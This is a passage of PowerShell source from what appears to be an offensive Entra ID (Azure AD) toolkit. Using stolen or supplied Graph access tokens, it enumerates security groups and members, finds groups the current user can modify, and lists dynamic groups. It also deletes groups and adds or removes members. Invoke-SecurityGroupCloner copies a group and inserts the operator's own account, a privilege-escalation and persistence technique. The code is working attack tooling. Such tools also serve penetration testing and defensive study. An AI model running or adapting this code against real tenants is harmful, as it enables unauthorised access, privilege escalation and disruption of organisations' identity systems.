        [String] $Device = "Windows",
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String] $Browser = "Edge", # Default value is "Edge"
        [Parameter(Mandatory = $False)]
        [switch] $AutoRefresh,
        [Parameter(Mandatory = $False)]
        $RefreshInterval = (60 * 10) # 10 minutes
    )

    if ($Tokens) {
        if (!$GraphRun) {
            Write-Host -ForegroundColor Yellow "[*] Using the provided access tokens."
        }
    } else {
        # Login
        Write-Host -ForegroundColor Yellow "[*] First, you need to log in."
        Write-Host -ForegroundColor Yellow "[*] If you already have tokens, you can use the -Tokens parameter to pass them to this function."
        while ($auth -notlike "Yes") {
            Write-Host -ForegroundColor Cyan "[*] Do you want to authenticate now (yes/no)?"
            $answer = Read-Host
            $answer = $answer.ToLower()
            if ($answer -eq "yes" -or $answer -eq "y") {
                Write-Host -ForegroundColor Yellow "[*] Running Get-GraphTokens now..."
                $tokens = Get-GraphTokens -ExternalCall
                $auth = "Yes"
            } elseif ($answer -eq "no" -or $answer -eq "n") {
                Write-Host -ForegroundColor Yellow "[*] Quitting..."
                return
            } else {
                Write-Host -ForegroundColor Red "Invalid input. Please enter Yes or No."
            }
        }
    }
    
    $accessToken = $tokens.access_token
    [string]$refreshToken = $tokens.refresh_token
    $headers = @{
        Authorization = "Bearer $accessToken"
    }
    
    if (!$GraphRun) {
        Write-Host -ForegroundColor Yellow "[*] Retrieving a list of security groups and their members from the directory..."
    }
    
    $graphApiUrl = "https://graph.microsoft.com/v1.0"
    $groupsUrl = "$graphApiUrl/groups?$filter=securityEnabled eq true"
    
    $groupsWithMemberIDs = @()
    $startTime = Get-Date
    $refresh_Interval = [TimeSpan]::FromSeconds($RefreshInterval)

    
    do {
        try {
            $groupsResponse = Invoke-RestMethod -Uri $groupsUrl -Headers $headers -Method Get
            $groups = $groupsResponse.value
        } catch {
            Write-Host -ForegroundColor Red "[*] An error occurred while retrieving security groups: $($_.Exception.Message)"
            return
        }

        foreach ($group in $groups) {
            if ((Get-Date) - $startTime -ge $refresh_interval) {
                Write-Host -ForegroundColor Yellow "[*] Pausing script for token refresh..."
                $reftokens = Invoke-RefreshGraphTokens -RefreshToken $refreshToken -AutoRefresh -tenantid $global:tenantid -Resource $Resource -Client $Client -ClientID $ClientID -Browser $Browser -Device $Device
                $accessToken = $reftokens.access_token
                [string]$refreshToken = $reftokens.refresh_token
                $headers = @{
                    Authorization = "Bearer $accessToken"
                }
                Write-Host -ForegroundColor Yellow "[*] Resuming script..."
                $startTime = Get-Date
            }
            
            $groupId = $group.id
            $membersUrl = "$graphApiUrl/groups/$groupId/members"
    
            try {
                $membersResponse = Invoke-RestMethod -Uri $membersUrl -Headers $headers -Method Get
                $members = $membersResponse.value
            } catch {
                if ($_.Exception.Response.StatusCode.value__ -match "429") {
                    Write-Host -ForegroundColor Red "[*] Being throttled... sleeping for 5 seconds"
                    Start-Sleep -Seconds 5
                } else {
                    Write-Host -ForegroundColor Red "[*] An error occurred while retrieving members for group $($group.displayName): $($_.Exception.Message)"
                }
            }
    
            $memberIds = $members | ForEach-Object { $_.id }
    
            $groupInfo = @{
                GroupName = $group.displayName
                MemberIds = $memberIds -join ","
            }
    
            Write-Output ("Group Name: " + $group.displayName + " | Group ID: " + $groupId)
            Write-Output ("Members: " + ($($members.userPrincipalName) -join ', '))
            Write-Output ""
            Write-Output ("=" * 80)
            $groupsWithMemberIDs += New-Object PSObject -Property $groupInfo
        }
    
        if ($groupsResponse.'@odata.nextLink') {
            $groupsUrl = $groupsResponse.'@odata.nextLink'
            if (!$GraphRun) {
                Write-Host -ForegroundColor Yellow "[*] Processing more groups..."
            }
        } else {
            $groupsUrl = $null
        }
    } while ($groupsUrl)
    
    if ($OutputFile) {
        # Export security groups to a CSV file
        $groupsWithMemberIDs | Export-Csv -Path $OutputFile -NoTypeInformation
        Write-Host -ForegroundColor Green "Security groups exported to $OutputFile."
    }

    return $groupsWithMemberIDs
}

function Create-SecurityGroupWithMembers {
    param (
        [string] $AccessToken,
        [string] $DisplayName,
        [string[]] $MemberIds
    )

    $graphApiUrl = "https://graph.microsoft.com/v1.0"
    $createGroupUrl = "$graphApiUrl/groups"

    $headers = @{
        Authorization = "Bearer $AccessToken"
        "Content-Type" = "application/json"
    }

    $groupProperties = @{
        displayName = $DisplayName
        securityEnabled = $true
        mailEnabled = $false
        mailNickname = $DisplayName -replace ' ', ''
        "members@odata.bind" = $MemberIds
    }

    $groupData = @{
        displayName = $DisplayName
        securityEnabled = $true
        mailEnabled = $false
        mailNickname = $DisplayName -replace ' ', ''
        "members@odata.bind" = $MemberIds
    }

    $groupJson = $groupData | ConvertTo-Json

    $response = Invoke-RestMethod -Uri $createGroupUrl -Headers $headers -Method Post -Body $groupJson

    if ($response -ne $null) {
        $groupid = $response.id
        Write-Host -ForegroundColor Green "Security Group '$DisplayName' created successfully."
        Write-Host -ForegroundColor Green "Group ID: $groupid"
    } else {
        Write-Error "Error creating the security group."
    }
}


function Invoke-DeleteGroup {
       <#
    .SYNOPSIS
        Deletes an Entra ID (AzureAD) group
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        Deletes an Entra ID (AzureAD) group

    .PARAMETER Tokens

        Token object for auth

    .PARAMETER GroupId
    
        The object ID of the group you want to delete 
               
    .EXAMPLES      
        
        C:\PS> Invoke-DeleteGroup -Tokens $tokens -groupID e6a413c2-2aa4-4a80-9c16-88c1687f57d9
    #>
    
    param (
        [string]
        $groupId,
        [object[]]
        $Tokens = ""
    )

    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshToken = $tokens.refresh_token 


    $url = "https://graph.microsoft.com/v1.0/groups/$groupId"

    $headers = @{
        "Authorization" = "Bearer $accessToken"
        "Content-Type" = "application/json"
    }

    try {
        Invoke-RestMethod -Uri $url -Headers $headers -Method Delete
        Write-Host -ForegroundColor Green "Group with ID '$groupId' deleted successfully."
    } catch {
        Write-Error "Failed to delete group with ID '$groupId': $_"
    }
}


function Invoke-SecurityGroupCloner{

    <#
        .SYNOPSIS
            Clones a security group in Azure Active Directory and allows you to add your own account.
            Author: Beau Bullock (@dafthack)
            License: MIT
            Required Dependencies: None
            Optional Dependencies: None

        .DESCRIPTION
        
           Clones a security group in Azure Active Directory and allows you to add your own account.

        .EXAMPLES      
        
            C:\PS> Invoke-SecurityGroupCloner -Tokens $tokens
    #>

    Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [object[]]
        $Tokens = ""
    )

    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshToken = $tokens.refresh_token 

    $headers = @{
        Authorization = "Bearer $accessToken"
    }

    $secgroups = Get-SecurityGroups -Tokens $tokens
    foreach($line in $secgroups){if(!$line.groupname){$Line}}
    $CloneGroup = ""
    while($CloneGroup -eq ""){
    Write-Host -ForegroundColor Cyan "[*] Enter a group name you want to clone:"
    $CloneGroup = Read-Host 

    if ($secgroups.GroupName -contains $CloneGroup) {
        Write-Host -ForegroundColor yellow ("[*] Found group " + $CloneGroup)
    } else {
        Write-Output "Invalid group try again."
        $CloneGroup = ""
    }
    }

    $memberIds = @()
    foreach ($group in $secgroups){
        If ($group.GroupName -eq $cloneGroup){
            $memberlist = $group.memberIds.split(",")
            foreach($member in $memberlist){
                $memberIds += ("https://graph.microsoft.com/v1.0/users/" + $member )
            }
        }
    }
    Write-Host -ForegroundColor Cyan "[*] Do you want to add your current user to the cloned group? (Yes/No)"
    $answer = Read-Host 
    $answer = $answer.ToLower()
    if ($answer -eq "yes" -or $answer -eq "y") {
        Write-Host -ForegroundColor yellow "[*] Adding current user to the cloned group..."
        $currentuser = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers
        $memberIds += ("https://graph.microsoft.com/v1.0/users/" + $currentuser.Id)
    } elseif ($answer -eq "no" -or $answer -eq "n") {
        Write-Output "[*] Not adding your user"
    } else {
        Write-Output "Invalid input. Please enter Yes or No."
    }

    Write-Host -ForegroundColor Cyan "[*] Do you want to add a different user to the cloned group? (Yes/No)"
    $difanswer = Read-Host 
    $difanswer = $difanswer.ToLower()
    if ($difanswer -eq "yes" -or $difanswer -eq "y") {
        Write-Host -ForegroundColor Cyan "[*] What is the email address of the user you want to add?"
        $useranswer = Read-Host 
        $useranswer = $useranswer.ToLower()
        Write-Host -ForegroundColor yellow "[*] Adding $useranswer to the cloned group..."
        $uri = "https://graph.microsoft.com/v1.0/users"
        $filter = "?`$filter=mail eq '$useranswer'"
        $otheruserid = Invoke-RestMethod -Uri "$uri$filter" -Headers $headers
        $userObjectId = $otheruserid.value[0].id
        $memberIds += ("https://graph.microsoft.com/v1.0/users/" + $userObjectId)
    } elseif ($difanswer -eq "no" -or $difanswer -eq "n") {
        Write-Output "[*] Not adding another user"
    } else {
        Write-Output "Invalid input. Please enter Yes or No."
    }

    Write-Host -ForegroundColor Cyan "[*] Do you want to change the group name: ($CloneGroup)? (Yes/No)"
    $groupanswer = Read-Host 
    $groupanswer = $groupanswer.ToLower()
    if ($groupanswer -eq "yes" -or $groupanswer -eq "y") {
        Write-Host -ForegroundColor yellow "[*] What do you want the group name to be?"
        $CloneGroup = Read-Host
    } elseif ($groupanswer -eq "no" -or $groupanswer -eq "n") {
        Write-host ('[*] Keeping the name "' + $CloneGroup + '"')
    } else {
        Write-Output "Invalid input. Please enter Yes or No."
    }


    $memberIdsUniq = $memberIds | Select-Object -Unique

    Create-SecurityGroupWithMembers -AccessToken $accessToken -DisplayName $CloneGroup -MemberIds $memberIdsUniq
}


function Get-UpdatableGroups{
    <#
        .SYNOPSIS
            Finds groups that can be updated by the current user. For example, if this reports any updatable groups then it may be possible to add new users to the reported group(s).
            Author: Beau Bullock (@dafthack)
            License: MIT
            Required Dependencies: None
            Optional Dependencies: None

        .DESCRIPTION
        
           Finds groups that can be updated by the current user. For example, if this reports any updatable groups then it may be possible to add new users to the reported group(s).

        .EXAMPLES      
        
            C:\PS> Get-UpdatableGroups -Tokens $tokens
            C:\PS> Get-UpdatableGroups -Tokens $tokens -Client Custom -ClientID "cb1056e2-e479-49de-ae31-7812af012ed8" -Resource "https://graph.microsoft.com/ -Device AndroidMobile -Browser Android 
    #>

    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [object]
        $Tokens,
        [Parameter()]
        [string]
        $GraphApiEndpoint = "https://graph.microsoft.com/v1.0/groups",
        [Parameter()]
        [string]
        $EstimateAccessEndpoint = "https://graph.microsoft.com/beta/roleManagement/directory/estimateAccess",
        [string]$RefreshToken,
        [Parameter(Mandatory = $False)]
        [string]
        $tenantid = $global:tenantid,
        [Parameter(Mandatory=$False)]
        [ValidateSet("Yammer","Outlook","MSTeams","Graph","AzureCoreManagement","AzureManagement","MSGraph","DODMSGraph","Custom","Substrate")]
        [String[]]
        $Client = "MSGraph",
        [Parameter(Mandatory=$False)]
        [String]
        $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",    
        [Parameter(Mandatory=$False)]
        [String]
        $Resource = "https://graph.microsoft.com",
        [Parameter(Mandatory=$False)]
        [ValidateSet('Mac','Windows','AndroidMobile','iPhone')]
        [String]
        $Device = "Windows",
        [Parameter(Mandatory=$False)]
        [ValidateSet('Android','IE','Chrome','Firefox','Edge','Safari')]
        [String]
        $Browser = "Edge",  # Set the default value to "Edge"
        [Parameter(Mandatory = $False)]
        [string]
        $OutputFile = "Updatable_groups.csv",  # Set the default value to "Updatable_groups.csv"
        [Parameter(Mandatory=$False)]
        [switch]
        $AutoRefresh,
        [Parameter(Mandatory=$False)]
        [Int]
        $RefreshInterval = (60 * 10) # 10 minutes
    )

    try {
        $accesstoken = $Tokens.access_token
        $refreshToken = $Tokens.refresh_token
        $headers = @{
            "Authorization" = "Bearer $accesstoken"
            "Content-Type" = "application/json"
        }

        $results = @()

        Write-Host -ForegroundColor yellow "[*] Now gathering groups and checking if each one is updatable."

        $startTime = Get-Date
        $refresh_Interval = [TimeSpan]::FromSeconds($RefreshInterval)

        do {
            try {
                try {
                $response = Invoke-RestMethod -Uri $GraphApiEndpoint -Headers $headers -Method Get
                } catch {
                    if ($_.Exception.Response.StatusCode.value__ -match "429") {
                        Write-Host -ForegroundColor Red "[*] Being throttled... sleeping for 5 seconds"
                        Start-Sleep -Seconds 5
                    } else {
                        Write-Host -ForegroundColor Red "[*] An error occurred while retrieving members for group $($group.displayName): $($_.Exception.Message)"
                    }
                }
                foreach ($group in $response.value) {
                    if ((Get-Date) - $startTime -ge $refresh_interval) {
                        Write-Host -ForegroundColor Yellow "[*] Pausing script for token refresh..."
                        $reftokens = Invoke-RefreshGraphTokens -RefreshToken $refreshToken -AutoRefresh -tenantid $global:tenantid -Resource $Resource -Client $Client -ClientID $ClientID -Browser $Browser -Device $Device
                        $accesstoken = $reftokens.access_token
                        $refreshToken = $reftokens.refresh_token
                        $headers = @{
                            "Authorization" = "Bearer $accesstoken"
                            "Content-Type" = "application/json"
                        }
                        Write-Host -ForegroundColor Yellow "[*] Resuming script..."
                        $startTime = Get-Date
                    }  

                    $groupid = ("/" + $group.id)
                    $requestBody = @{
                        resourceActionAuthorizationChecks = @(
                            @{
                                directoryScopeId = $groupid
                                resourceAction = "microsoft.directory/groups/members/update"
                            }
                        )
                    } | ConvertTo-Json

                    try {
                        try {
                        $estimateresponse = Invoke-RestMethod -Uri $EstimateAccessEndpoint -Headers $headers -Method Post -Body $requestBody
                        }
                        catch {
                            if ($_.Exception.Response.StatusCode.value__ -match "429") {
                                Write-Host -ForegroundColor Red "[*] Being throttled... sleeping for 5 seconds"
                                Start-Sleep -Seconds 5
                            } else {
                                Write-Host -ForegroundColor Red "[*] An error occurred while estimating access: $($_.Exception.Message)"
                            }
                        }
                        if ($estimateresponse.value.accessDecision -eq "allowed") {
                            Write-Host -ForegroundColor Green ("[+] Found updatable group: " + $group.displayName + ": " + $group.id)
                            $group.displayName+":"+$group.id|Out-File  -Append -Encoding Ascii $OutputFile
                            $groupout = $group | Select-Object -Property displayName, id, description, isAssignableToRole, onPremisesSyncEnabled, mail, createdDateTime, visibility
                            $results += $groupout
                        }
                    } catch {
                        Write-Host "Error estimating access for $groupid : $_"
                    }
                }

                if ($response.'@odata.nextLink') {
                    $GraphApiEndpoint = $response.'@odata.nextLink'
                    Write-Host -ForegroundColor Yellow "[*] Processing more groups..."
                } else {
                    $GraphApiEndpoint = $null  # No more pages, exit the loop
                }
            } catch {
                Write-Host "Error fetching Group IDs: $_"
            }
        } while ($GraphApiEndpoint)

        if ($results.Count -gt 0) {
            Write-Host -ForegroundColor Green ("[*] Found " + $results.Count + " groups that can be updated.")

            foreach ($result in $results) {
                Write-Host ("=" * 80)
                Write-Output $result

                Write-Host ("=" * 80)
            }
        }

        if ($OutputFile) {
            $results | Export-Csv -Path $OutputFile -NoTypeInformation
            Write-Host -ForegroundColor Green ("[*] Exported updatable groups to $OutputFile")
        }
    } catch {
        Write-Host -ForegroundColor Red "An error occurred: $_"
    }
}




function Get-DynamicGroups{
    <#
        .SYNOPSIS
            Finds groups that use dynamic membership.
            Author: Beau Bullock (@dafthack)
            License: MIT
            Required Dependencies: None
            Optional Dependencies: None

        .DESCRIPTION
        
            Finds groups that use dynamic membership.

        .EXAMPLES      
        
            C:\PS> Get-DynamicGroups -Tokens $tokens
    #>

    Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [object[]]
        $Tokens = ""
    )

    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshToken = $tokens.refresh_token 


    $graphApiEndpoint = "https://graph.microsoft.com/v1.0/groups"
    $estimateAccessEndpoint = "https://graph.microsoft.com/beta/roleManagement/directory/estimateAccess"

    $headers = @{
        "Authorization" = "Bearer $accessToken"
        "Content-Type" = "application/json"
    }

    $results = @()
    Write-Host -ForegroundColor yellow "[*] Now gathering groups and checking if each one is a dynamic group."
    do {

        try {
            try{
                $response = Invoke-RestMethod -Uri $graphApiEndpoint -Headers $headers -Method Get
            }catch {
                if($_.Exception.Response.StatusCode.value__ -match "429"){
                Write-Host -ForegroundColor red "[*] Being throttled... sleeping 5 seconds"
                Start-Sleep -Seconds 5 
                }
                
            }
            foreach ($group in $response.value) {
                $groupid = ("/" + $group.id)
                $requestBody = @{
                    resourceActionAuthorizationChecks = @(
                        @{
                            directoryScopeId = $groupid
                            resourceAction = "microsoft.directory/groups/members/update"
                        }
                    )
                } | ConvertTo-Json

                if ($group.membershipRule -ne $null) {
                    Write-Host -ForegroundColor green ("[+] Found dynamic group: " + $group.displayName)
                    $results += [PSCustomObject]@{
                        "Group Name" = $group.displayName
                        "Group ID" = $group.id
                        "Description" = $group.description
                        "Is Assignable To Role" = $group.isAssignableToRole
                        "On-Prem Sync Enabled" = $group.onPremisesSyncEnabled
                        "Mail" = $group.mail
                        "Created Date" = $group.createdDateTime
                        "Visibility" = $group.visibility
                        "MembershipRule" = $group.membershipRule
                        "Membership Rule Processing State" = $group.membershipRuleProcessingState
                    }
                }
            }
            
            # Check if there are more pages of results
            if ($response.'@odata.nextLink') {
                $graphApiEndpoint = $response.'@odata.nextLink'
                Write-Host -ForegroundColor yellow "[*] Processing more groups..."
            } else {
                $graphApiEndpoint = $null  # No more pages, exit the loop
            }
        } catch {
            Write-Host "Error fetching Group IDs: $_"
        }
    } while ($graphApiEndpoint)

    if ($results.count -gt 0) {
        Write-Host -ForegroundColor Green ("[*] Found " + $results.count + " dynamic groups.")

        foreach ($result in $results) {
            Write-Output ("=" * 80)
            Write-Output $result
            Write-Output ""
        }
        Write-Output ("=" * 80)
    }


}
function Invoke-AddGroupMember {
    
    <#
    .SYNOPSIS
        Adds a member object ID to a group
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        Adds a member object ID to a group

    .PARAMETER Tokens

        Token object for auth

    .PARAMETER GroupId
    
        The object ID of the group you want to modify 
        
    .PARAMETER UserId
    
        The ID of the object that you want to add to the group
        
    .EXAMPLES      
        
        C:\PS> Invoke-AddGroupMember -Tokens $tokens -groupID e6a413c2-2aa4-4a80-9c16-88c1687f57d9 -userId 7a3d8bfe-e4c7-46c0-93ec-ef2b1c8a0b4a
    #>
    
    param (
        [string]
        $groupId,
        [string]
        $userId,
        [object[]]
        $Tokens = ""
    )

    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshToken = $tokens.refresh_token 

    $url = ("https://graph.microsoft.com/v1.0/groups/$groupId/members/" + '$ref')

    $headers = @{
        "Authorization" = "Bearer $accessToken"
        "User-Agent" = "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3031"
        "Content-Type" = "application/json"
    }

    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$userId"
    } | ConvertTo-Json

    try {
        $response = Invoke-RestMethod -Uri $url -Headers $headers -Method Post -Body $body
        Write-host -ForegroundColor green "[*] Member added successfully."
    } catch {
        Write-Error "[*] Failed to add member to the security group: $_"
    }
}


function Invoke-RemoveGroupMember {
    
    <#
    .SYNOPSIS
        Removes a member object ID from a group
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        Removes a member object ID from a group

    .PARAMETER Tokens

        Token object for auth

    .PARAMETER GroupId
    
        The object ID of the group you want to modify 
        
    .PARAMETER UserId
    
        The ID of the object that you want to remove from the group
        
    .EXAMPLES      
        
        C:\PS> Invoke-RemoveGroupMember -Tokens $tokens -groupID e6a413c2-2aa4-4a80-9c16-88c1687f57d9 -userId 7a3d8bfe-e4c7-46c0-93ec-ef2b1c8a0b4a
    #>
    
    param (
        [string]
        $groupId,
        [string]
        $userId,
        [object[]]
        $Tokens = ""
    )

    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshToken = $tokens.refresh_token 

    $url = ("https://graph.microsoft.com/v1.0/groups/$groupId/members/" + $userid + '/$ref')

    $headers = @{
        "Authorization" = "Bearer $accessToken"
        "User-Agent" = "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3031"
        "Content-Type" = "application/json"
    }

    try {
        $response = Invoke-RestMethod -Uri $url -Headers $headers -Method Delete
        Write-host -ForegroundColor green "[*] Member removed successfully."
    } catch {
        Write-Error "[*] Failed to remove member from the security group: $_"
    }
}


function Get-EntraIDGroupInfo {
    <#
    .SYNOPSIS
        A function to retrieve group information 
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
        A function to retrieve group information 

    .PARAMETER Tokens

        File path to a text file with group names and guids exported from Get-UpdatableGroups

    .PARAMETER GroupList
    
        The object ID of the group you want to modify 
        
    .PARAMETER GroupName
    
        A specific group name to lookup

    .PARAMETER GroupGUID

        A specific group guid to lookup
        
    .EXAMPLES      
        
        C:\PS> Get-EntraIDGroupInfo -Tokens $tokens -GroupList .\updatable-groups-output.txt

    .EXAMPLES

        C:\PS> Get-EntraIDGroupInfo -Token $tokens -GroupName "admin"

    .EXAMPLES

        C:\PS> Get-EntraIDGroupInfo -Token $tokens -GroupGUID "<input group object guid here>"

    #>


    param(
        [object[]]$Tokens,         # Your Azure access token
        [string]$GroupList,    # File path to a text file with group names and guids exported from Get-UpdatableGroups
        [string]$GroupName,     # Specific group name to lookup
        [string]$GroupGUID      # Specific group guid to lookup
    )

    if($Tokens){
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    }
    else{
         # Login
         Write-Host -ForegroundColor yellow "[*] First, you need to login." 
         Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
         while($auth -notlike "Yes"){
                Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
                $answer = Read-Host 
                $answer = $answer.ToLower()
                if ($answer -eq "yes" -or $answer -eq "y") {
                    Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                    $tokens = Get-GraphTokens -ExternalCall
                    $auth = "Yes"
                } elseif ($answer -eq "no" -or $answer -eq "n") {
                    Write-Host -ForegroundColor Yellow "[*] Quitting..."
                    return
                } else {
                    Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
                }
            }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshToken = $tokens.refresh_token 
  
    $headers = @{
        'Authorization' = "Bearer $accesstoken"
    }

    if ($GroupName){
        $encodedDisplayName = [System.Web.HttpUtility]::UrlEncode($GroupName)
        $groupUrl = "https://graph.microsoft.com/v1.0/groups?`$filter=displayName eq '$encodeddisplayName'"
        Invoke-GroupLookup -headers $headers -groupurl $groupUrl
    }
    if($GroupGuid){
        $groupUrl = "https://graph.microsoft.com/v1.0/groups/$groupguid"
        Invoke-GroupLookup -headers $headers -groupurl $groupUrl
    }
    if($GroupList){
        Write-Host "[*] Using the provided list of groups."
        $groupNames = Get-Content $GroupList
        foreach ($line in $groupNames) {
            $guid = $line -replace '.*:\s*(\w{8}-\w{4}-\w{4}-\w{4}-\w{12})$', '$1'  # Extract the GUID
            $groupUrl = "https://graph.microsoft.com/v1.0/groups/$guid"
            Invoke-GroupLookup -headers $headers -groupurl $groupUrl
        }
    }
}

function Invoke-GroupLookup{
    param(
    $headers,         
    [string]$groupurl
    )
    try {
        $response = Invoke-RestMethod -Uri $groupUrl -Headers $headers -Method Get
    } catch {
        Write-Host "Group with GUID '$guid' not found."
        continue
    }
    if($response.value.count -gt 1){
        foreach($group in $response.value){
            Write-Host "Group Name: $($group.displayName)" 
            Write-Host "Group ID: $($group.id)"
            if ($group.groupTypes -match "Unified"){
                Write-Host "Group Type: Microsoft 365 Group"
            }
            else{
                Write-Host "Group Type: Security or Distribution Group"
            }
            if ($group.securityEnabled){
                Write-Host "Security Enabled: $($group.securityEnabled)" 
            }
            if ($group.visibility){
                Write-Host "Visibility: $($group.visibility)" 
            }
            if ($group.onPremisesSyncEnabled){
                Write-Host "OnPrem Sync Enabled: $($group.onPremisesSyncEnabled)" 
                Write-Host "OnPrem Domain Name: $($group.onPremisesDomainName)"
                Write-Host "OnPrem NetBIOS Name: $($group.onPremisesNetBiosName)"
                Write-Host "OnPrem SAM Account Name: $($group.onPremisesSamAccountName)"
            }
            if ($group.isAssignableToRole){
                Write-Host "Role-Assignable: $($group.isAssignableToRole)" 
            }
            if ($group.resourceProvisioningOptions){
                Write-Host "Provisioning Options: $($group.resourceProvisioningOptions -join ', ')" 
            }
            if ($group.resourceBehaviorOptions){
                Write-Host "Behavior Options: $($group.resourceBehaviorOptions -join ',')" 
            }
            Write-Host "-----------------------------"
        }
    }
    else{
        Write-Host "Group Name: $($response.displayName)" 
        Write-Host "Group ID: $($response.id)"
        if ($response.groupTypes -match "Unified"){
            Write-Host "Group Type: Microsoft 365 Group"
        }
        else{
            Write-Host "Group Type: Security or Distribution Group"
        }
        if ($response.securityEnabled){
            Write-Host "Security Enabled: $($response.securityEnabled)" 
        }
        if ($response.visibility){
            Write-Host "Visibility: $($response.visibility)" 
        }
        if ($response.onPremisesSyncEnabled){
            Write-Host "OnPrem Sync Enabled: $($response.onPremisesSyncEnabled)" 
            Write-Host "OnPrem Domain Name: $($response.onPremisesDomainName)"
            Write-Host "OnPrem NetBIOS Name: $($response.onPremisesNetBiosName)"
            Write-Host "OnPrem SAM Account Name: $($response.onPremisesSamAccountName)"
        }
        if ($response.isAssignableToRole){
            Write-Host "Role-Assignable: $($response.isAssignableToRole)" 
        }
        if ($response.resourceProvisioningOptions){
